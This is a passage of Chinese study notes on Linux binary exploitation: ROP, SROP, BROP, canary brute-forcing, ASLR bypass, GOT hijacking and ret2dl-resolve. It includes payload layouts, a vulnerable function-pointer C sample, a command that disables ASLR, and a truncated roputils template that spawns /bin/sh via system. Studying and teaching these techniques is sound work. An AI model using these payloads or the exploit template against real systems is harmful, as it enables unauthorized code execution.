DynELF</strong></p>\n<p>DynELF是pwntools提供的一个模块，可以帮助我们在没有libc文件时找到system()的地址。</p>\n<ul>\n<li>使用<pre><code>      DynELF(leak,elf=ELF(&#39;&#39;)).lookup(&#39;system&#39;,&#39;libc&#39;)\n      leak，需要自己实现的函数，在此函数中至少要泄漏一个字节的内存。\n</code></pre>\n</li>\n<li>leak()的形式</li>\n</ul>\n<p>def leak(address):<br>  …</p>\n<p> return data</p>\n<p>还有”/bin/sh”<br>需要注意的是，DynElF无法搜索到”/bin/sh”的地址，这里可以用一个read()把”/bin/sh”写到bss段上</p>\n<p><strong>DEP绕过之ROP</strong></p>\n<p>面向返回编程（Return-Oriented Programming，ROP）是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。</p>\n<p><strong>关于gadget</strong></p>\n<p>攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列称为gadget。</p>\n<p>每一段gadget通常是结束于return指令，并位于共享库代码中的子程序。系列调用这些代码，攻击者可以在拥有更简单攻击防范的程序内执行任意操作。</p>\n<p><strong>32位栈溢出和64位的区别</strong></p>\n<ul>\n<li><p>内存地址范围从32位增加到64位</p>\n</li>\n<li><p>函数参数的传递由压栈传参变成了先由寄存器传参，依次是RDI，RSI，RDX，RCX，R8和     R9，不够用时才会通过栈来传递</p>\n</li>\n<li><p>内存地址不大于0x00007fffffffffff，否则抛出异常。</p>\n</li>\n<li><p>64位下re2libc </p>\n</li>\n<li><ul>\n<li>buffer + pop_rdi_ret + binsh_addr + system()</li>\n<li>或者buffer + pop_rax_pop_rdi_call_rax + system() + binsh_addr</li>\n</ul>\n</li>\n<li><p>主要的gadget </p>\n</li>\n<li><ul>\n<li>传参（pop xxx,ret）</li>\n<li>系统调用函数（system()，exec()）</li>\n</ul>\n</li>\n</ul>\n<p><strong>ROPgadeget</strong></p>\n<p>$ ROPgadget –binary –only “pop|ret”</p>\n<p>~/Documents/pwnkr/bof $ ROPgadget –binary bof –only “pop|ret”</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x000005ee : pop ebp ; ret</span><br><span class=\"line\">0x00000624 : pop ebx ; pop ebp ; ret</span><br><span class=\"line\">0x000005ec : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class=\"line\">0x0000070c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x000004a0 : pop ebx ; ret</span><br><span class=\"line\">0x0000070e : pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x000005ed : pop esi ; pop ebp ; ret</span><br><span class=\"line\">0x0000070d : pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x0000047f : ret</span><br><span class=\"line\">Unique gadgets found: 9</span><br></pre></td></tr></table></figure>\n\n<p>程序比较小时，gadget的数量也不多，也可以考虑搜索libc.so中的gadget，可用的很多。</p>\n<p><strong>Libc上的Gadget</strong></p>\n<p>能够泄漏libc基地址时，使用libc的gadget更加方便和容易，libc上可用的gadget就很丰富了。</p>\n<p>$ ROPgadget –binary /lib/i386-linux-gnu/libc.so.6 –only “pop|ret”<br> …<br> Unique gadgets found: 1226</p>\n<p><strong>ret2__libc_csu_init</strong></p>\n<p>libc_csu_init()用于对libc进行初始化操作的函数，只要使用了libc函数就一定会有此函数出现，而绝大多数的程序都会调用libc的函数，即__libc_csu_init()广泛存在于linux程序中。</p>\n<p>__libc_csu_init()中的gadget也可以作为通用gadget。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class=\"line\">.text:00000000004005C0                 public __libc_csu_init</span><br><span class=\"line\">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16\u0018o</span><br><span class=\"line\">.text:00000000004005C0                 push    r15</span><br><span class=\"line\">.text:00000000004005C2                 push    r14</span><br><span class=\"line\">.text:00000000004005C4                 mov     r15d, edi</span><br><span class=\"line\">.text:00000000004005C7                 push    r13</span><br><span class=\"line\">.text:00000000004005C9                 push    r12</span><br><span class=\"line\">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class=\"line\">.text:00000000004005D2                 push    rbp</span><br><span class=\"line\">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class=\"line\">.text:00000000004005DA                 push    rbx</span><br><span class=\"line\">.text:00000000004005DB                 mov     r14, rsi</span><br><span class=\"line\">.text:00000000004005DE                 mov     r13, rdx</span><br><span class=\"line\">.text:00000000004005E1                 sub     rbp, r12</span><br><span class=\"line\">.text:00000000004005E4                 sub     rsp, 8</span><br><span class=\"line\">.text:00000000004005E8                 sar     rbp, 3</span><br><span class=\"line\">.text:00000000004005EC                 call    _init_proc</span><br><span class=\"line\">.text:00000000004005F1                 test    rbp, rbp</span><br><span class=\"line\">.text:00000000004005F4                 jz      short loc_400616</span><br><span class=\"line\">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class=\"line\">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class=\"line\">.text:0000000000400600</span><br><span class=\"line\">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54\u0019j</span><br><span class=\"line\">.text:0000000000400600                 mov     rdx, r13</span><br><span class=\"line\">.text:0000000000400603                 mov     rsi, r14</span><br><span class=\"line\">.text:0000000000400606                 mov     edi, r15d</span><br><span class=\"line\">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class=\"line\">.text:000000000040060D                 add     rbx, 1</span><br><span class=\"line\">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class=\"line\">.text:0000000000400614                 jnz     short loc_400600</span><br><span class=\"line\">.text:0000000000400616</span><br><span class=\"line\">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34\u0018j</span><br><span class=\"line\">.text:0000000000400616                 add     rsp, 8</span><br><span class=\"line\">.text:000000000040061A                 pop     rbx</span><br><span class=\"line\">.text:000000000040061B                 pop     rbp</span><br><span class=\"line\">.text:000000000040061C                 pop     r12</span><br><span class=\"line\">.text:000000000040061E                 pop     r13</span><br><span class=\"line\">.text:0000000000400620                 pop     r14</span><br><span class=\"line\">.text:0000000000400622                 pop     r15</span><br><span class=\"line\">.text:0000000000400624                 retn</span><br><span class=\"line\">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>最后连续的6个pop，可以用栈溢出控制rbx，rbp，r12，r13，r14，r15</li>\n<li>之后从400600开始可以控制到rdi（通过edi），rsi，rdx的值，并call[r12+rbx*8]。<br>通过上面的调用可以控制到三个传递参数的寄存器，并且执行一次call，完成ret2libc。</li>\n</ul>\n<p><strong>JOP</strong></p>\n<p>$ ROPgadget –binary BIN –only “pop|jmp”</p>\n<p>以jmp结束的一系列指令，原理与普通ROP类似。</p>\n<p><strong>SROP</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626173337625.png\" alt=\"image-20210626173337625\" style=\"zoom:50%;\" />\n\n<p>signal机制是一套被广泛应用于unix的机制，它通常用于系统在用户态和内核态切换，执行如杀死进程，设置进程定时器等功能。</p>\n<p>如图所示，内核向进程发起signal。进程挂起，进入内核（1），内核为进程保存上下文，跳到signal handler，之后又返回内核态，上下文恢复，最后返回最初的进程。</p>\n<p>重点在第二步和第三步上，我们可以把signal handler理解为一个特殊的函数，这个函数返回地址是rt_sigreturn，在执行完signal handler，会返回到rt_sigretrun，而rt_sigreturn会将上下文参数恢复。下图是linux系统保存在栈上的上下文信息。</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626173459882.png\" alt=\"image-20210626173459882\" style=\"zoom:70%;\" />\n\n<p>可以看到，寄存器的值作为上下文信息的一部分被保存在了栈上，而在rt_sigreturn 执行时又会把寄存器的值从栈上复制到寄存器中，从而恢复用户进程挂起之前的状态。其中，内核为用户恢复上下文时不会对栈上的上下文信息进行检查。意即，我们完全可以通过栈溢出伪造一个存储上下文信息的栈，通过rt_sigreturn将栈上的数据放到寄存器中。如下图</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626173550488.png\" alt=\"image-20210626173550488\" style=\"zoom:67%;\" />\n\n<p><strong>system call chains</strong></p>\n<p>那么此时当rt_sigreturn 执行完毕后，随后就会执行rip指向的syscall()，并且以rax和rdi为参数。明显的，这个函数调用会弹出一个shell，攻击完成。</p>\n<p>如果栈上存放的rip指向的地址不仅仅是syscall()而是syscall(),ret的gadget，并且控制栈指针指向另一个Fake Signal Frame，可以生成一系列的signal调用。</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626174128518.png\" alt=\"image-20210626174128518\" style=\"zoom:50%;\" />\n\n<p>可以看到，寄存器的值作为上下文信息的一部分被保存在了栈上，而在rt_sigreturn 执行时又会把寄存器的值从栈上复制到寄存器中，从而恢复用户进程挂起之前的状态。其中，内核为用户恢复上下文时不会对栈上的上下文信息进行检查。意即，我们完全可以通过栈溢出伪造一个存储上下文信息的栈，通过rt_sigreturn将栈上的数据放到寄存器中。如下图</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626174307723.png\" alt=\"image-20210626174307723\" style=\"zoom:50%;\" />\n\n<p><strong>BROP (blind rop)</strong></p>\n<p>BROP与其说是rop技巧，更不如说是寻找gadget的技巧，它的特长在于，可以在没有源程序的情况下寻找有效的gadget，是一种适用于远程攻击的rop，针对的是64位系统。</p>\n<ul>\n<li>攻击条件<br>在前面我们提到了aslr保护，也就是地址随机化保护，在远程服务器中，服务器端的程序进程崩溃之后会自动重新启动。而对于大部分服务器应用来说，崩溃后重启的地址与崩溃前一样，也就是说虽然服务器端开启了额aslr保护，但只会在第一次启动时生效，崩溃后的重启并不会再次启用aslr随机化。当我们遇到这种远程程序的时候，可以反复进行崩溃尝试而不必担心aslr的影响。</li>\n</ul>\n<p><strong>stack reading</strong></p>\n<p>用于绕过canary保护</p>\n<p>canary（金丝雀）</p>\n<p>过去由于缺少气体环境的检测工具，煤矿工人会带着金丝雀下矿洞，金丝雀对于周围气体非常敏感，如果金丝雀死亡，则说明有大量的危险气体，这时矿工就会撤离。</p>\n<p>在现代操作系统中，canary是一种防止栈溢出的保护机制，在开辟函数栈时，会先在fs块内存中的某个地方读取值并存到栈上，当函数运行到返回之前，会先检查当前栈上的数据与一开始从fs块上读取的值是否相同（通常是一个异或比较），若不同，则认为程序被栈溢出攻击，直接崩溃。狭义的来说，栈上一开始保存的数据，被我们称为canary。需要注意的是，canary的最低一位一般为“/x00”，这是为了防止canary被一些可以打印栈上数据的漏洞泄露。</p>\n<ul>\n<li>必要条件,崩溃后的重启不会改变canary的值。</li>\n<li>开启canary保护时栈上的布局,Buffer|canary|pre ebp|ret</li>\n</ul>\n<p><strong>覆盖canary</strong></p>\n<p>32位系统下canary长度一般为4个字节，64位下则是8个字节。</p>\n<p>进行爆破尝试时，如果仅仅是枚举所有可能的数值，则最多需要尝试4294967296（FFFF+1）次，无疑时非常低效的。</p>\n<ul>\n<li>改进<br>为了提升效率，我们可以采用逐字节爆破的方式，具体见图。对于逐字节爆破，最大尝试次数仅为4*256=1024</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626174745466.png\" alt=\"image-20210626174745466\" style=\"zoom:80%;\" />\n\n<p><strong>blind</strong></p>\n<p>这里的blind是指没有本地二进制文件或者源码的情况，即只有位于远程服务器端程序。</p>\n<p>不同于本地二进制文件或源码，我们可以直接扫描本地内存获取gadget，远程服务器端的程序，我们很难找到有效的gadget。此时我们可以换个思路，先远程dump内存，利用write（）或者puts（）这类的输出函数来实现。</p>\n<p><strong>寻找起write()和puts()参数的gadgets</strong></p>\n<p>这类gadgets一般形式是pop xxx,ret</p>\n<ul>\n<li>trap地址<pre><code>      当程序执行到这个地址时，程序会崩溃。这种地址很常见，内存中到处都是这类地址，一个随机跳转的地址总是能引起程序崩溃。\n</code></pre>\n</li>\n<li>stop地址<pre><code>      区别于trap地址，当程序执行到这个地址时，程序会被挂起或者无限循环。\n</code></pre>\n</li>\n</ul>\n<p><strong>brop gadget</strong></p>\n<p>在libc_csu_init的结尾一段这样的指令</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626175012882.png\" alt=\"image-20210626175012882\" style=\"zoom:80%;\" />\n\n<p>可以看到，这段指令的特殊之处在于它是连续6个pop接一个ret。这种结构非常少见，意即我们可以通过寻找这种结构的gadget来找到这段指令。由上图可以看到的是，这段brop gadget虽然只是对rbx，rbx，r12，r13，r14，r15进行pop然后ret，但是通过分析其机器码，若程序从偏移0x7开始执行，指令则变为pop rsi，pop r15，ret。若程序从偏移0x9开始执行，指令则变为pop rdi，ret。所以若找到这段brop gadget，我们便可以通过偏移找到起第一个和第二个函数参数的gadget。</p>\n<p><strong>寻找brop gadget的地址</strong></p>\n<p>下面讲如何用trap地址和stop地址试探brop gadget的地址。我们把payload进行如下构造buffer+canary+rbp+ret+trap*6+stop+trap*n。其中，buffer和rbp的值随意填，ret的值从0x400000开始枚举，一般情况下，由于我们是枚举地址，程序会崩溃。当程序并没有崩溃而是挂起，即无限循环时，记下此时的ret的值。枚举结束后，得到若干ret的值，这里需要注意，得到的ret值有可能不是brop gadget的地址而刚好是另一个stop地址。</p>\n<p>如果是stop地址，把ret后所有地址都设为trap地址，若仍然会导致程序挂起，则确认是stop地址。</p>\n<p><strong>第三个参数的gadget</strong></p>\n<ul>\n<li>对于puts()，此时的gadgets其实已经足够，但是对于write(),仍然需要一个起参数的gadget。</li>\n<li>pop rdx,ret难以寻找，用strcmp()代替。<br>strcmp()可以对rdx进行赋值。</li>\n<li>最后用puts()或者write()dump内存，寻找更多的gadgets来完成攻击。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">学习日记3</span><br></pre></td></tr></table></figure>\n\n<p><strong>ASLR</strong></p>\n<p>地址空间配置随机载入（Address Space Layout Randomization，ASLR，又称地址空间配置随机化、地址空间布局随机化）是一种防范内存损坏漏洞被利用的计算机安全技术。</p>\n<p>地址空间配置随机载入利用随机方式配置资料定址空间，使某些敏感资料（例如作业系统内核）配置到一个恶意程式无法事先获知的位址，令攻击者难以进行攻击。</p>\n<p>传统攻击：</p>\n<ul>\n<li>基础栈溢出：需要定位shellcode</li>\n<li>return-to-libc：     需要libc地址</li>\n</ul>\n<p>开启ASLR后：libc基址不再固定，shellcode的地址（栈、bss等地址）在每一次运行时也相应地发生改变，传统的地址硬编码的攻击基本失效。</p>\n<table>\n<thead>\n<tr>\n<th><strong>Aspect</strong></th>\n<th><strong>aslr</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>表现</td>\n<td>优异-每次加载都会随机</td>\n</tr>\n<tr>\n<td>发布</td>\n<td>获得内核支持，不需要重新编译</td>\n</tr>\n<tr>\n<td>兼容性</td>\n<td>对安全应用程序透明（位置独立）</td>\n</tr>\n<tr>\n<td>保护效果</td>\n<td>64位下效果显著</td>\n</tr>\n</tbody></table>\n<p>查看当前ASLR状态：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> cat /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure>\n\n<p> 2</p>\n<p>该值为：</p>\n<ul>\n<li>1: 随机化堆栈，VDSO，共享内存区域的位置</li>\n<li>2: 同上，并添加数据段的随机</li>\n<li>0: 禁用ASLR</li>\n</ul>\n<p>linux关闭ASLR:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">echo</span> 0 &gt;&gt; /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>ASLR Bypass</strong></p>\n<ul>\n<li><p>leak address</p>\n</li>\n<li><p>暴力破解</p>\n</li>\n<li><p>非随机化内存</p>\n</li>\n<li><p>ret2text</p>\n</li>\n<li><p>函数指针</p>\n</li>\n<li><p>GOT表劫持（不依赖libc空间）</p>\n</li>\n<li><p>rewrite GOT[]</p>\n</li>\n<li><p>ret2dl-resolve</p>\n</li>\n<li><p>栈juggling</p>\n</li>\n<li><p>ret2ret</p>\n</li>\n<li><p>ret2pop</p>\n</li>\n<li><p>ret2eax</p>\n</li>\n</ul>\n<p><strong>ASLR Bypass之leak address</strong></p>\n<p>开启ASLR后无法通过控制eip来直接输出地址。</p>\n<p>但是可以通过覆盖相关数据来间接地泄露地址。</p>\n<p>如：</p>\n<ul>\n<li>输出内容中是否有地址信息</li>\n<li>如：精心设计的输出、未初始化的变量等</li>\n<li>覆盖输出函数的指针</li>\n<li>如：覆盖printf()的参数</li>\n<li>覆盖输出的缓冲区大小</li>\n<li>如：覆盖write(),memcpy()的参数</li>\n</ul>\n<p><strong>ASLR Bypass之暴力绕过</strong></p>\n<ul>\n<li>使用大量NOP填充shellcode，提高地址命中率，并暴力搜索栈的地址<pre><code>      payload： nop*n + shellcode\n</code></pre>\n</li>\n</ul>\n<h3 id=\"ASLR-Bypass之非随机化内存\"><a href=\"#ASLR-Bypass之非随机化内存\" class=\"headerlink\" title=\"ASLR Bypass之非随机化内存\"></a><strong>ASLR Bypass之非随机化内存</strong></h3><p>ret2text</p>\n<p>text段有可以执行的程序代码，并且地址不会被除PIE之外的ASLR随机化,可以将程序执行流劫持到意外的（但已经存在）的程序函数</p>\n<p><strong>函数指针劫持</strong></p>\n<p>覆盖一个函数指针指向：</p>\n<ul>\n<li>程序函数</li>\n<li>程序连接表中的其他库函数</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">secret</span><span class=\"params\">(<span class=\"keyword\">char</span> *input)</span></span>&#123;... &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">chk_pwd</span><span class=\"params\">(<span class=\"keyword\">char</span> *input)</span></span>&#123;... &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">int</span> (*ptr)(<span class=\"keyword\">char</span> *input);</span><br><span class=\"line\"><span class=\"keyword\">char</span> buf[<span class=\"number\">8</span>];</span><br><span class=\"line\">ptr = &amp;chk_pwd;</span><br><span class=\"line\"><span class=\"built_in\">strncpy</span>(buf,argv[<span class=\"number\">1</span>],<span class=\"number\">12</span>);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;hello %s!\\n&quot;</span>,buf);</span><br><span class=\"line\">(*ptr)(argv[<span class=\"number\">2</span>]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>ASLR Bypass之GOT劫持</strong></p>\n<ul>\n<li>第一次运行函数<br>函数先跳转到plt表，从plt表跳转到got表，got表中存储的是该函数在plt表中的地址+4偏移，于是又跳转到plt下，执行push     xx，jmp &lt;got [0]&gt;，其中push是给检索函数提供参数，jmp到got表的检索函数，此时got表中就会填充函数的准确地址</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;hello world\\n&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; disass main</span><br><span class=\"line\">Dump of assembler code for function main:</span><br><span class=\"line\">0x0000000000400526 &lt;+0&gt;:\tpush   rbp</span><br><span class=\"line\">0x0000000000400527 &lt;+1&gt;:\tmov    rbp,rsp</span><br><span class=\"line\">0x000000000040052a &lt;+4&gt;:\tmov    edi,0x4005c4</span><br><span class=\"line\">0x000000000040052f &lt;+9&gt;:\tcall   0x400400 &lt;puts@plt&gt;</span><br><span class=\"line\">0x0000000000400534 &lt;+14&gt;:\tmov    eax,0x0</span><br><span class=\"line\">0x0000000000400539 &lt;+19&gt;:\tpop    rbp</span><br><span class=\"line\">0x000000000040053a &lt;+20&gt;:\tret</span><br><span class=\"line\">End of assembler dump.</span><br><span class=\"line\">pwndbg&gt; disass *0x400400</span><br><span class=\"line\">No function contains specified address.</span><br><span class=\"line\">pwndbg&gt; disass 0x400400</span><br><span class=\"line\">Dump of assembler code for function puts@plt:</span><br><span class=\"line\">0x0000000000400400 &lt;+0&gt;:\tjmp    QWORD PTR [rip+0x200c12]        # 0x601018</span><br><span class=\"line\">0x0000000000400406 &lt;+6&gt;:\tpush   0x0</span><br><span class=\"line\">0x000000000040040b &lt;+11&gt;:\tjmp    0x4003f0</span><br><span class=\"line\">End of assembler dump.</span><br><span class=\"line\">pwndbg&gt; x 0x601018</span><br><span class=\"line\">0x601018:\t0x00400406</span><br></pre></td></tr></table></figure>\n\n<p><strong>改写GOT表项</strong></p>\n<ul>\n<li>GOT中存储的是函数在内存中的真实地址</li>\n<li>利用方法</li>\n<li>覆盖got表中的地址，当程序运行某一个函数，实际执行的是另一个我们覆盖的函数。</li>\n<li>e.g.:覆盖printf()为system()</li>\n</ul>\n<p><strong>ret2dl-resolve（32位为例）</strong></p>\n<p>elf.h:</p>\n<p>#define reloc_offset reloc_arg</p>\n<ul>\n<li>计算重定位条目基址 Elf32_Rel  * reloc = JMPREL + reloc_offset;</li>\n<li>计算符号表条目基址 Elf32_Sym  * sym = &amp;SYMTAB[ ELF32_R_SYM (reloc-&gt;r_info) ];</li>\n<li>获得符号名称 const char  *symname = strtab + sym-&gt;st_name;</li>\n<li>通过符号名称symname搜索动态库，将地址填入function@got（即&amp;GOT+reloc_offset）</li>\n<li>调整堆栈，执行function</li>\n</ul>\n<p>可通过伪造两个相关的数据结构：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  Elf32_Addr    r_offset;       <span class=\"comment\">/* Address */</span></span><br><span class=\"line\">  Elf32_Word    r_info;         <span class=\"comment\">/* Relocation type and symbol index */</span></span><br><span class=\"line\">&#125; Elf32_Rel;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  Elf32_Word    st_name;        <span class=\"comment\">/* Symbol name (string tbl index) */</span></span><br><span class=\"line\">  Elf32_Addr    st_value;       <span class=\"comment\">/* Symbol value */</span></span><br><span class=\"line\">  Elf32_Word    st_size;        <span class=\"comment\">/* Symbol size */</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> st_info;        <span class=\"comment\">/* Symbol type and binding */</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> st_other;       <span class=\"comment\">/* Symbol visibility */</span></span><br><span class=\"line\">  Elf32_Section st_shndx;       <span class=\"comment\">/* Section index */</span></span><br><span class=\"line\">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>\n\n<p>控制reloc_offset的数值，使const char *symname指向伪造的数据结构中的函数名。最后在function@got即&amp;GOT+reloc_offset中填入我们伪造的symname（如system）函数的真实地址。</p>\n<p><strong>ret2dl-resolve自动利用工具roputils</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#现成32位模板：</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> roputils <span class=\"keyword\">import</span> *</span><br><span class=\"line\">fpath = sys.argv[<span class=\"number\">1</span>]</span><br><span class=\"line\">offset = <span class=\"built_in\">int</span>(sys.argv[<span class=\"number\">2</span>])</span><br><span class=\"line\">rop = ROP(fpath)</span><br><span class=\"line\">addr_bss = rop.section(<span class=\"string\">&#x27;.bss&#x27;</span>)</span><br><span class=\"line\">buf = rop.retfill(offset)</span><br><span class=\"line\">buf += rop.call(<span class=\"string\">&#x27;read&#x27;</span>, <span class=\"number\">0</span>, addr_bss, <span class=\"number\">100</span>)</span><br><span class=\"line\">buf += rop.dl_resolve_call(addr_bss+<span class=\"number\">20</span>, addr_bss)</span><br><span class=\"line\">p = Proc(rop.fpath)</span><br><span class=\"line\">p.write(p32(<span class=\"built_in\">len</span>(buf)) + buf)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] read: %r&quot;</span> % p.read(<span class=\"built_in\">len</span>(buf))</span><br><span class=\"line\">buf = rop.string(<span class=\"string\">&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">buf += rop.fill(<span class=\"number\">20</span>, buf)</span><br><span class=\"line\">buf += rop.dl_resolve_data(addr_bss+<span class=\"number\">20</span>, <span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">buf += 